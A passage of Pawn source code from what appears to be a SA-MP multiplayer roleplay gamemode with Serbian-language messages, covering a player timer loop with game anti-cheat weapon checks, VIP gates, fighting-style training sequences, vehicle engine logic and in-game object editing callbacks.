		}

		if( Odbrojavanje[ i ] != 0 ) {
			format( globalstring, sizeof( globalstring ), "~w~Pricekajte, Vreme: ~y~%d", Odbrojavanje[ i ] );
			PlayerTextDrawSetString( i, PVreme[ i ][ 1 ], globalstring );
			Odbrojavanje[ i ]--;
		}

		if( ( id = Boombox_Nearest(i)) != INVALID_PLAYER_ID && Boombox[ i ] != id && strlen (BoomboxInfo[ id ][ boomboxURL ] ) && !IsPlayerInAnyVehicle( i ) ) {
		    new str[ 128 ];
		    strunpack(str, BoomboxInfo[ id ][ boomboxURL ] );
		    Boombox[ i ] = id;

		    StopAudioStreamForPlayer( i );
		    PlayAudioStreamForPlayer( i, str, BoomboxInfo[ id ][ boomboxPos ][ 0 ], BoomboxInfo[ id ][ boomboxPos ][ 1 ], BoomboxInfo[ id ][ boomboxPos ][ 2 ], 30.0, 1);
		}
		else if( Boombox[ i ] != INVALID_PLAYER_ID && !IsPlayerInRangeOfPoint( i, 30.0, BoomboxInfo[ Boombox[ i ] ][ boomboxPos ][ 0 ], BoomboxInfo[ Boombox[ i ] ][ boomboxPos ][ 1 ], BoomboxInfo[ Boombox[ i ] ][boomboxPos][ 2 ] ) ) {
		    Boombox[ i ] = INVALID_PLAYER_ID;
		    StopAudioStreamForPlayer(i);
		}

		if( PlayerInfo[ i ][ xLevel ] < 2 && !HungerGame{i} && !RadiVojnik{i} && !RadiSabotazer{i} && !FunRace{i} && !UTutorialu[i] && !DeagleMasterIgra[i] && !MichaelMisija1CP2[i] && !MichaelMisija1CP3[i] && radiMisiju[i] < 2 && !radiLovac[i]){
			for( new g = 0; g < 13; g++) {
	    	    new sweapon, sammo;
   				GetPlayerWeaponData( i, g, sweapon, sammo );
        		if( sweapon != 0 && sammo != 0 ) {
                    if(sweapon == 43) return 0;
 		    		ResetAllWeapons( i );
 		    		GameTextForPlayer( i, "~w~Ti si Level 1-2 ne mozes~n~~b~posedovati oruzje!", 5000, 3 );
 		    		format( globalstring, sizeof( globalstring ), "| V:AC | Oruzje || %s[ID: %d] | Level manji od 2 !", ImeIgraca( i ), i );
			        AdminPoruka( ANTICHEAT, globalstring );
			    }
			}
		}

        if( PlayerInfo[ i ][ xDisarm ] == 1 && !HungerGame{i} && !RadiVojnik{i} && !RadiSabotazer{i} && !FunRace{i} && !UTutorialu[i] && !DeagleMasterIgra[i] && !MichaelMisija1CP2[i] && !MichaelMisija1CP3[i] && radiMisiju[i] < 2 && !radiLovac[i]){
            for( new g = 0; g < 13; g++) {
                new sweapon, sammo;
                GetPlayerWeaponData( i, g, sweapon, sammo );
                if( sweapon != 0 && sammo != 0 ) {
                    ResetAllWeapons( i );
                    GameTextForPlayer( i, "~w~Imas disarm ne mozes~n~~b~posedovati oruzje!", 5000, 3 );
                    format( globalstring, sizeof( globalstring ), "| V:AC | Oruzje || %s[ID: %d] | Disarm !", ImeIgraca( i ), i );
                    AdminPoruka( ANTICHEAT, globalstring );
                }
            }
        }
		
		if( IsPlayerInRangeOfPoint( i, 10.0, 1694.98083, 1944.81506, 12.22370 ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 6 || PlayerInfo[ i ][ xPromoter ] >= 1 ) {
		        if( PromoterskaKapija == false ) {
					MoveDynamicObject( promkapija, 1694.98083, 1944.81506, 5.22370, 2.0 );
					SetTimer( "PromoterKapijaClose", 7000, 0 );
					PromoterskaKapija = true;
				}
			}
		}
		
		if( IsPlayerInRangeOfPoint( i, 10.0, 1957.3341, 26.4949, 32.2609 ) ) {
		    if( PlayerInfo[ i ][ xAdmin ] >= 4 || PlayerInfo[ i ][ xVIPLevel ] >= 1 ) {
				MoveDynamicObject( vipkapija, 1957.2865, 27.1640, 25.7361, 2.0 );
				SetTimer( "VIPKapijaClose", 7000, 0 );
			}
		}
		
		if( GetPlayerSurfingVehicleID( i ) != INVALID_VEHICLE_ID &&
			!AdminDuty[ i ] &&
			GetSpeed( i ) > 50 &&
			!IsVehicleBrod( GetPlayerSurfingVehicleID( i ) ) &&
			GetVehicleModel( GetPlayerSurfingVehicleID( i ) ) != 406 &&
			GetVehicleModel( GetPlayerSurfingVehicleID( i ) ) != 422 &&
			GetVehicleModel( GetPlayerSurfingVehicleID( i ) ) != 433 ) {
			
			new Float:slx, Float:sly, Float:slz;
            GetPlayerPos( i, slx, sly, slz );
            SetPlayerPos( i, slx, sly, slz+5 );
            
            SCM( i, SVETLOCRVENA, "| V:AC | Slapovan si jer je zabranjeno voziti se na autu!");
		}

	}
	return 1;
}
//------------------------------------------------------------------------------

forward PromoterKapijaClose( );
public PromoterKapijaClose( ) {
    MoveDynamicObject( promkapija, 1694.98083, 1944.81506, 12.43130, 2.00 );
	PromoterskaKapija = false;
}
//------------------------------------------------------------------------------
forward GradjevinarKapijaClose( );
public GradjevinarKapijaClose( ) {
    MoveDynamicObject( gradjkapija, 2413.5092800, -1374.3330100, 24.8653000, 2.00 );
}
forward VIPKapijaClose( );
public VIPKapijaClose( ) {
    MoveDynamicObject( vipkapija, 1957.28650, 27.16401, 34.93608, 2.00 );
}
//------------------------------------------------------------------------------
public CarDamageTimer( playerid ) {
    new Float:vHealth,
        newcar = GetPlayerVehicleID( playerid ),
		engine, lights, alarm, doors, bonnet, boot, objective;

	if( IsPlayerInAnyVehicle( playerid ) ) {
	    if( !IsVehicleLetelica( newcar ) && !IsVehicleBrod( newcar ) && !IsVehicleBajs( newcar ) ) {

		    GetVehicleHealth(newcar, vHealth);

            if(DronVozi[playerid] != -1) {

                SetVehicleHealth(newcar, 1000.00);
            }

			if( vHealth >= 250 && vHealth <= 350 ) {
			    GetVehicleParamsEx(newcar,engine, lights, alarm, doors, bonnet, boot, objective );
		   		SetVehicleParamsEx(newcar,0,lights,alarm,doors,bonnet,boot,objective);
				SetCameraBehindPlayer( playerid );
				GameTextForPlayer( playerid, "~r~Vozilo je unisteno. Koristite /call 555 ili ukucajte /exit za napustanje vozila.", 3000, 1);
				vCanDrive[newcar] = 0;
			}
		}
	}
}
//------------------------------------------------------------------------------
public AntiSpawnCrash()
{
	carspawntimer = 0;
}
//------------------------------------------------------------------------------
public KickIgraca( playerid )
{
	Kick( playerid );
	return 1;
}
//------------------------------------------------------------------------------
public GPSConnect( playerid, gpslvl, vehicleid)
{
	// if login edit if(Bit1_Get(g_PlayerLogged, playerid) != 0)

	    if(gpslvl == 1)
	    {
	    	new TmpZone[MAX_ZONE_NAME];
			GetVehicleZone( vehicleid, TmpZone, sizeof(TmpZone));
			SendInfoMessage( playerid, "Vase vozilo je u cetvrti: %s", TmpZone);

	    	new Float:x,Float:y,Float:z;
			GetVehiclePos( vehicleid, x, y, z);

			Novi_SetPlayerCheckpoint( playerid, x, y, z, 5.0);
	        CheckpointStatus[ playerid ] = 1;
	        SetPVarInt( playerid, "LocatingCar", 1);
	        SetPVarInt( playerid, "GPSTimerCalled", 0);

	        GameTextForPlayer( playerid, "~g~gps aktiviran", 3000, 1);
	    }
		return 1;
}
//------------------------------------------------------------------------------
public BoxTrain( playerid ) {
	if(Training[ playerid ] == 0 ) {
		TogglePlayerControllable( playerid, 0);
		Novi_SetPlayerPos( playerid, 768.1064,14.3897,1000.6992);
		SetPlayerFacingAngle( playerid, 266.8890);
		SetPlayerCameraPos( playerid, 765.4290,8.6809,1000.7123);
		SetPlayerCameraLookAt( playerid, 768.1064,14.3897,1000.6992);
		ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,9500);
		SetTimerEx("BoxTrain", 10000, false, "i", playerid);
		Training[ playerid ]  = 1;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Training... ~n~~l~] ] ]",10000,3);
	}
	else if(Training[ playerid ] == 1 ) {
	   	SetPlayerCameraPos( playerid, 771.5601,11.3144,1000.7026);
		SetPlayerCameraLookAt( playerid, 768.1064,14.3897,1000.6992);
		ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,14500);
		SetTimerEx("BoxTrain", 15000, false, "i", playerid);
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Training... ~n~~y~] ~l~] ]",15000,3);
		Training[ playerid ]  = 2;
	}
	else if( Training[ playerid ] == 2 ) {
		BussinesMoney( uFirmi[ playerid ], 100 );
		SetPlayerCameraPos( playerid, 772.9484,-0.2051,1000.7241);
		SetPlayerCameraLookAt( playerid, 768.1064,14.3897,1000.6992);
		ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.1,1,1,1,1,19500);
		SetTimerEx("BoxTrain", 20000, false, "i", playerid);
		Training[ playerid ]  = 3;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~Training... ~n~~y~] ] ~l~]",20000,3);
	}
	else if( Training[ playerid ] == 3 ) {
	    TogglePlayerControllable( playerid, 1);
		SetCameraBehindPlayer( playerid );
		ClearAnimations( playerid );
		SCM( playerid, SRVBOJA1, "Zavrsio si svoj trening, i naucio borbeni stil Boxing!");
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~y~] ] ]",10000,3);
  		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_BOXING);
		PlayerInfo[ playerid ][ xBStil ] = 1; SavePlayer( playerid );
	    Training[ playerid ]  = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
public KungTrain( playerid ) {
    if(Training[ playerid ]  == 0) {
		TogglePlayerControllable( playerid, 0);
		Novi_SetPlayerPos( playerid, 772.6890,5.4252,1000.7802);
		SetPlayerFacingAngle( playerid, 89.2975);
		SetPlayerCameraPos( playerid, 767.2456,-0.7102,1000.7197);
		SetPlayerCameraLookAt( playerid, 772.6890,5.4252,1000.7802);
		ApplyAnimation( playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,7500);
		SetTimerEx("KungTrain", 8000, false, "i", playerid);
		Training[ playerid ]  = 1;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Training... ~n~~l~] ] ]",10000,3);
	}
	else if(Training[ playerid ]  == 1) {
	    SetPlayerCameraPos( playerid, 765.4534,8.1254,1000.7133);
		SetPlayerCameraLookAt( playerid, 772.6890,5.4252,1000.7802);
		ApplyAnimation( playerid,"BSKTBALL","BBALL_def_loop",4.0,1,0,0,0,12500);
		SetTimerEx("KungTrain", 13000, false, "i", playerid);
		Training[ playerid ]  = 2;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Training... ~n~~b~] ~l~] ]",13000,3);
	}
	else if(Training[ playerid ]  == 2) {
		BussinesMoney( uFirmi[ playerid ], 120 );
		SetPlayerCameraPos( playerid, 774.3497,10.2337,1000.7027);
		SetPlayerCameraLookAt( playerid, 772.6890,5.4252,1000.7802);
		ApplyAnimation( playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,17500);
		SetTimerEx("KungTrain", 18000, false, "i", playerid);
		Training[ playerid ]  = 3;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Training... ~n~~b~] ] ~l~]",18000,3);
	}
	else if(Training[ playerid ]  == 3)
	{
	    TogglePlayerControllable( playerid, 1);
		SetCameraBehindPlayer( playerid );
		ClearAnimations( playerid );
		SCM( playerid, SRVBOJA1, "Zavrsio si svoj trening, i naucio borbeni stil Kung Fu-a!");
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~b~] ] ]",10000,3);
		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KUNGFU);
		PlayerInfo[ playerid ][ xBStil ] = 2; SavePlayer( playerid );
		Training[ playerid ]  = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
public GrabTrain( playerid )
{
    if(Training[ playerid ]  == 0)
	{
		TogglePlayerControllable( playerid, 0);
		Novi_SetPlayerPos( playerid, 767.1951,-2.5557,1000.7187);
		SetPlayerFacingAngle( playerid, 172.0182);
		SetPlayerCameraPos( playerid, 772.6243,-0.1576,1000.7242);
		SetPlayerCameraLookAt( playerid, 767.1951,-2.5557,1000.7187);
		ApplyAnimation( playerid,"GANGS","shake_carSH",4.0,1,0,0,0,8500);
		SetTimerEx("GrabTrain", 9000, false, "i", playerid);
		Training[ playerid ]  = 1;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Training... ~n~~l~] ] ]",9000,3);
	}
	else if(Training[ playerid ]  == 1)
	{
	    SetPlayerCameraPos( playerid, 763.0099,2.6098,1001.5942);
		SetPlayerCameraLookAt( playerid, 767.1951,-2.5557,1000.7187);
		ApplyAnimation( playerid,"GANGS","shake_cara",4.0,1,0,0,0,13500);
		SetTimerEx("GrabTrain", 14000, false, "i", playerid);
		Training[ playerid ]  = 2;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Training... ~n~~p~] ~l~] ]",14000,3);
	}
	else if(Training[ playerid ]  == 2)
	{
		BussinesMoney( uFirmi[ playerid ], 140 );
		SetPlayerCameraPos( playerid, 769.8934,8.1243,1000.7101);
		SetPlayerCameraLookAt( playerid, 767.1951,-2.5557,1000.7187);
		ApplyAnimation( playerid,"FIGHT_D","FightD_G",4.0,1,0,0,0,18500);
		SetTimerEx("GrabTrain", 19000, false, "i", playerid);
		Training[ playerid ]  = 3;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~Training... ~n~~p~] ] ~l~]",19000,3);
	}
	else if(Training[ playerid ]  == 3)
	{
	    TogglePlayerControllable( playerid, 1);
		SetCameraBehindPlayer( playerid );
		ClearAnimations( playerid );
		SCM( playerid, SRVBOJA1, "Zavrsio si svoj trening, i naucio borbeni stil Grab'n'Kick!");
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~p~] ] ]",10000,3);
  		SetPlayerFightingStyle ( playerid, FIGHT_STYLE_GRABKICK);
		PlayerInfo[ playerid ][ xBStil ] = 4; SavePlayer( playerid );
	    Training[ playerid ]  = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
public KneeTrain( playerid ) {
	if(Training[ playerid ]  == 0) {
		TogglePlayerControllable( playerid, 0);
		Novi_SetPlayerPos( playerid, 772.4446,5.4702,1000.7802);
		SetPlayerFacingAngle( playerid, 89.8261);
		SetPlayerCameraPos( playerid, 764.1777,5.6911,1000.7161);
		SetPlayerCameraLookAt( playerid, 772.4446,5.4702,1000.7802);
		ApplyAnimation( playerid,"GYMNASIUM","GYMshadowbox",4.0,1,1,1,1,29500);
		SetTimerEx("KneeTrain", 30000, false, "i", playerid);
		Training[ playerid ]  = 1;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Training... ~n~~l~] ] ]",30000,3);
	}
	else if(Training[ playerid ]  == 1) {
	    SetPlayerCameraPos( playerid, 770.2583,-2.5223,1000.7255);
		SetPlayerCameraLookAt( playerid, 772.4446,5.4702,1000.7802);
		ApplyAnimation( playerid,"PARK","Tai_Chi_Loop",4.0,1,0,0,0,34500);
		SetTimerEx("KneeTrain", 35000, false, "i", playerid);
		Training[ playerid ]  = 2;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Training... ~n~~r~] ~l~] ]",35000,3);
	}
	else if(Training[ playerid ]  == 2) {
		BussinesMoney( uFirmi[ playerid ], 160 );
		SetPlayerCameraPos( playerid, 765.2747,12.5178,1000.7049);
		SetPlayerCameraLookAt( playerid, 772.4446,5.4702,1000.7802);
		ApplyAnimation( playerid,"BSKTBALL","BBALL_Dnk",4.0,1,0,0,0,36500);
		SetTimerEx("KneeTrain", 37000, false, "i", playerid);
		Training[ playerid ]  = 3;
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~Training... ~n~~r~] ] ~l~]",37000,3);
	}
	else if( Training[ playerid ]  == 3 ) {
	    TogglePlayerControllable( playerid, 1);
		SetCameraBehindPlayer( playerid );
		ClearAnimations( playerid );
		SCM( playerid, SRVBOJA1, "Zavrsio si svoj trening, i naucio borbeni stil KneeHead!");
		GameTextForPlayer( playerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~Finished! ~n~~r~] ] ]",10000,3);
	    SetPlayerFightingStyle ( playerid, FIGHT_STYLE_KNEEHEAD);
		PlayerInfo[ playerid ][ xBStil ] = 3; SavePlayer( playerid );
	    Training[ playerid ]  = 0;
	}
	return 1;
}
//------------------------------------------------------------------------------
public VehicleEngineStart( playerid ) {
    if( IsPlayerConnected( playerid ) ) {
        new engine,lights,alarm,doors,bonnet,boot,objective,
    		vehicle = GetPlayerVehicleID( playerid ),
            Float:vHealth,
            RandomStart;

        RandomStart = random(10);
		GetVehicleHealth(vehicle, vHealth);
		SetPVarInt( playerid, "StartingVehicle", 0);
		if(vHealth >= 800 && vHealth <= 1000) {
    		switch( RandomStart ) {
    	    	case 0..8:
			 	{
					//vEngine[vehicle] = ON;
				 	SendInfoMessage( playerid, "Uspesno ste pokrenuli motor.");
				 	TogglePlayerControllable( playerid, true );
				 	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            		SetVehicleParamsEx(vehicle,1,lights,alarm,doors,bonnet,boot,objective);
			 	}
			 	case 9:
				 	SendInfoMessage( playerid, "Niste uspjeli pokrenuti motor.");
			}
		}
		else if(vHealth >= 500 && vHealth <= 799)
		{
    	 	switch(RandomStart)
    	 	{
    	    	case 0..7:
			 	{
					//vEngine[vehicle] = ON;
				 	SendInfoMessage( playerid, "Uspesno ste pokrenuli motor.");
				 	TogglePlayerControllable( playerid, true );
				 	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            		SetVehicleParamsEx(vehicle,1,lights,alarm,doors,bonnet,boot,objective);
			 	}
			 	case 8,9:
				 	SendInfoMessage( playerid, "Niste uspjeli pokrenuti motor.");
			}
		}
		else if(vHealth >= 351 && vHealth <= 499)
		{
            switch(RandomStart)
    	 	{
    	    	case 0..5:
			 	{
				 	//vEngine[vehicle] = ON;
				 	SendInfoMessage( playerid, "Uspesno ste pokrenuli motor.");
				 	TogglePlayerControllable( playerid, true );
				 	GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
            		SetVehicleParamsEx(vehicle,1,lights,alarm,doors,bonnet,boot,objective);
			 	}
			 	case 6..9:
				 	SendInfoMessage( playerid, "Niste uspjeli pokrenuti motor.");
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
// public OnPlayerEditObject(playerid, playerobject, objectid, response, Float:fX, Float:fY, Float:fZ, Float:fRotX, Float:fRotY, Float:fRotZ) {
 
//     if(response == EDIT_RESPONSE_FINAL) {
//         if(KreiraNargilu[ playerid ] != 0) {
//             new i = KreiraNargilu[ playerid ];
//             DestroyObject(NargilaInfo[ i ][ nargilaID ]);
//             NargilaInfo[ i ][ nargilaID ] = CreateDynamicObject(2726, fX, fY, fZ, fRotX, fRotY, fRotZ);
//             NargilaLabel[ i ] = Create3DTextLabel("/nargila\nNije iznamljena.", 0xFFFFFFFF, fX, fY, fZ, 10.0, 0, 0);
//             NargilaInfo[ i ][ nargilaPosX ] = fX;
//             NargilaInfo[ i ][ nargilaPosY ] = fY;
//             NargilaInfo[ i ][ nargilaPosZ ] = fZ;
//             NargilaInfo[ i ][ nargilaRotX ] = fRotX;
//             NargilaInfo[ i ][ nargilaRotY ] = fRotY;
//             NargilaInfo[ i ][ nargilaRotZ ] = fRotZ;
//             SaveNargila(i);
//             SendClientMessage(playerid, -1, "Zavrsili ste kreiranje nargile.");
//         }
//     }
//     return 1;
// }
//------------------------------------------------------------------------------
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	new Float:oldX, Float:oldY, Float:oldZ,
		Float:oldRotX, Float:oldRotY, Float:oldRotZ;
	GetDynamicObjectPos(objectid, oldX, oldY, oldZ);
	GetDynamicObjectRot(objectid, oldRotX, oldRotY, oldRotZ);
	if( response == EDIT_RESPONSE_FINAL )
	{

        if(KreiraNargilu[ playerid ] != -1) {
            new i = KreiraNargilu[ playerid ];
            DestroyDynamicObject(NargilaInfo[ i ][ nargilaID ]);
            NargilaInfo[ i ][ nargilaID ] = CreateDynamicObject(2726, x, y, z, rx, ry, rz);
            NargilaLabel[ i ] = Create3DTextLabel("/nargila\nNije iznamljena.", 0xFFFFFFFF, x, y, z, 10.0, 0, 0);
            NargilaInfo[ i ][ nargilaPosX ] = x;
            NargilaInfo[ i ][ nargilaPosY ] = y;
            NargilaInfo[ i ][ nargilaPosZ ] = z;
            NargilaInfo[ i ][ nargilaRotX ] = rx;
            NargilaInfo[ i ][ nargilaRotY ] = ry;
            NargilaInfo[ i ][ nargilaRotZ ] = rz;
            SaveNargila(i);
            SendClientMessage(playerid, -1, "Zavrsili ste kreiranje nargile.");

            KreiraNargilu[ playerid ] = -1;

            return 1;
        }

		if( EditDGate[ playerid ] != -1 ) {
		    new g = EditDGate[ playerid ];
		    
		    GateData[ g ][ gatePos ][ 0 ] = x;
			GateData[ g ][ gatePos ][ 1 ] = y;
			GateData[ g ][ gatePos ][ 2 ] = z;
			GateData[ g ][ gatePos ][ 3 ] = rx;
			GateData[ g ][ gatePos ][ 4 ] = ry;
			GateData[ g ][ gatePos ][ 5 ] = rz;
			
			SendInfoMessage( playerid, "Uspesno sacuvana pozicija zatvorene kapije.");
			SCM( playerid, SRVBOJA1, "Sada sacuvajte poziciju otvorene kapije.");
		    
            EditDynamicObject( playerid, GateData[ g ][ gateObject ] );
			SaveGate( g ); EditDGate[ playerid ] = -1; EditDGateMove[ playerid ] = g;
		    return true;
		}
		if( EditDGateMove[ playerid ] != -1 ) {
		    new g = EditDGateMove[ playerid ];

		    GateData[ g ][ gateMove ][ 0 ] = x;
			GateData[ g ][ gateMove ][ 1 ] = y;
			GateData[ g ][ gateMove ][ 2 ] = z;
			GateData[ g ][ gateMove ][ 3 ] = rx;
			GateData[ g ][ gateMove ][ 4 ] = ry;
			GateData[ g ][ gateMove ][ 5 ] = rz;

			SendInfoMessage( playerid, "Uspesno sacuvana pozicija otvorene kapije.");
			SPD( playerid, dialog_CREATEGATE_2, DSI, D_NASLOV, "Unesite brzinu zatvaranja i otvaranja kapije( 0-20.0).", D_ODABERI, D_NAZAD );
		    DestroyDynamicObject( GateData[ g ][ gateObject ] );
		    GateData[ g ][ gateObject ] = CreateDynamicObject( GateData[ g ][ gateModel ], GateData[ g ][ gatePos ][ 0 ], GateData[ g ][ gatePos ][ 1 ], GateData[ g ][ gatePos ][ 2 ], GateData[ g ][ gatePos ][ 3 ], GateData[ g ][ gatePos ][ 4 ], GateData[ g ][ gatePos ][ 5 ], GateData[ g ][ gateWorld ], GateData[ g ][ gateInterior ] );
   
			SaveGate( g ); EditDGate[ playerid ] = g; EditDGateMove[ playerid ] = -1;
		    return true;
		}
		if( EditKontejnera[ playerid ] != -1 ) {
		    new i = EditKontejnera[ playerid ];
		   	DestroyDynamicObject( KontInfo[ i ][ koObjID ] );
            if(IsValidDynamic3DTextLabel(KontLabel[i]))
                DestroyDynamic3DTextLabel(KontLabel[i]);

		   	KontInfo[ i ][ koObjPos ][ 0 ] = x;
    		KontInfo[ i ][ koObjPos ][ 1 ] = y;
    		KontInfo[ i ][ koObjPos ][ 2 ] = z;
    		KontInfo[ i ][ koObjRot ][ 0 ] = rx;
    		KontInfo[ i ][ koObjRot ][ 1 ] = ry;
    		KontInfo[ i ][ koObjRot ][ 2 ] = rz;
			KontInfo[ i ][ koObjID ] = CreateDynamicObject(1345, x, y, z, rx, ry, rz);
			SacuvajKont( i );

            KontLabel[i] = CreateDynamic3DTextLabel(""col_white"Da pretrazite kontenjer kucajte\n"col_crvena"[ /kopajkontenjer ]", 0x0000000FF, x, y, z+1, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);

			EditKontejnera[ playerid ] = -1;
			return true;
		}
		if( EditATM[ playerid ] != -1 )	{
		    new i = EditATM[ playerid ];
		   	DestroyDynamicObject( atmInfo[ i ][ atmObject ] );

		   	atmInfo[ i ][ atmPos ][ 0 ] = x;
    		atmInfo[ i ][ atmPos ][ 1 ] = y;
    		atmInfo[ i ][ atmPos ][ 2 ] = z;
    		atmInfo[ i ][ atmPos ][ 3 ] = rx;
    		atmInfo[ i ][ atmPos ][ 4 ] = ry;
    		atmInfo[ i ][ atmPos ][ 5 ] = rz;
    		atmInfo[ i ][ atmPreseceneZice ] = false;
			atmInfo[ i ][ atmProbijenBios ] = false;
			atmInfo[ i ][ atmVremeDoRoba ] = 0;
			atmInfo[ i ][ atmExists ] = true;
			atmInfo[ i ][ atmObject ] = CreateDynamicObject(2942, x, y, z, rx, ry, rz);
			SacuvajATM( i );

			atmInfo[ i ][ atmText3D ] = CreateDynamic3DTextLabel( ""col_white"Da koristite bankomat kucajte\n"col_crvena"[ /atm ]", -1, atmInfo[ i ][atmPos][0], atmInfo[ i ][atmPos][1], atmInfo[ i ][atmPos][2], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1 );

			EditATM[ playerid ] = -1;
			return true;
		}
		if( EditRadar[ playerid ] != -1 )	{
		
		    new radarID = EditRadar[ playerid ];
		   	DestroyDynamicObject( radarInfo[ radarID ][ radarObject ] );

		   	radarInfo[ radarID ][ radarPos ][ 0 ] = x;
    		radarInfo[ radarID ][ radarPos ][ 1 ] = y;
    		radarInfo[ radarID ][ radarPos ][ 2 ] = z;
    		radarInfo[ radarID ][ radarPos ][ 3 ] = rx;
    		radarInfo[ radarID ][ radarPos ][ 4 ] = ry;
    		radarInfo[ radarID ][ radarPos ][ 5 ] = rz;
			radarInfo[ radarID ][ radarObject ] = CreateDynamicObject( 18880, x, y, z, rx, ry, rz );
			SaveRadar( radarID );

			EditRadar[ playerid ] = -1;
			return true;
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
public OnPlayerEditAttachedObject( playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if( response ) {
    
        if( EditingBody[ playerid ] == 1 ) {
        
            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 ) {
	            EditAttachedObject( playerid, OBJECT_SLOT_MASKSUNGL );
	            SendErrorMessage( playerid, "Losa pozicija naocara odradi je ponovo." );
	            return true;
	        }
	        
            PlayerInfo[ playerid ][ xSungMaskPos ][ 0 ] = fOffsetX;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 1 ] = fOffsetY;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 2 ] = fOffsetZ;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 3 ] = fRotX;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 4 ] = fRotY;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 5 ] = fRotZ;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 6 ] = fScaleX;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 7 ] = fScaleY;
			PlayerInfo[ playerid ][ xSungMaskPos ][ 8 ] = fScaleZ;
			EditingBody[ playerid ] = 0; SavePlayer( playerid );
        }
        else if( EditingBody[ playerid ] == 2 ) {

            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 ) {
	            EditAttachedObject( playerid, OBJECT_SLOT_BANDANA );
	            SendErrorMessage( playerid, "Losa pozicija marame odradi je ponovo." );
	            return true;
	        }
            PlayerInfo[ playerid ][ xFacePos ][ 0 ] = fOffsetX;
			PlayerInfo[ playerid ][ xFacePos ][ 1 ] = fOffsetY;
			PlayerInfo[ playerid ][ xFacePos ][ 2 ] = fOffsetZ;
			PlayerInfo[ playerid ][ xFacePos ][ 3 ] = fRotX;
			PlayerInfo[ playerid ][ xFacePos ][ 4 ] = fRotY;
			PlayerInfo[ playerid ][ xFacePos ][ 5 ] = fRotZ;
			PlayerInfo[ playerid ][ xFacePos ][ 6 ] = fScaleX;
			PlayerInfo[ playerid ][ xFacePos ][ 7 ] = fScaleY;
			PlayerInfo[ playerid ][ xFacePos ][ 8 ] = fScaleZ;
			EditingBody[ playerid ] = 0; SavePlayer( playerid );
        }
        else if( EditingBody[ playerid ] == 3 ) {

            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 ) {
	            EditAttachedObject( playerid, OBJECT_SLOT_HEAD );
	            SendErrorMessage( playerid, "Losa pozicija kape/marame/sesira odradi je ponovo." );
	            return true;
	        }
            PlayerInfo[ playerid ][ xHeadPos ][ 0 ] = fOffsetX;
			PlayerInfo[ playerid ][ xHeadPos ][ 1 ] = fOffsetY;
			PlayerInfo[ playerid ][ xHeadPos ][ 2 ] = fOffsetZ;
			PlayerInfo[ playerid ][ xHeadPos ][ 3 ] = fRotX;
			PlayerInfo[ playerid ][ xHeadPos ][ 4 ] = fRotY;
			PlayerInfo[ playerid ][ xHeadPos ][ 5 ] = fRotZ;
			PlayerInfo[ playerid ][ xHeadPos ][ 6 ] = fScaleX;
			PlayerInfo[ playerid ][ xHeadPos ][ 7 ] = fScaleY;
			PlayerInfo[ playerid ][ xHeadPos ][ 8 ] = fScaleZ;
			EditingBody[ playerid ] = 0; SavePlayer( playerid );
        }
        else if( EditingBody[ playerid ] == 4 ) {

            if( fScaleX > 2.0 || fScaleY > 2.0 || fScaleZ > 2.0 ) {
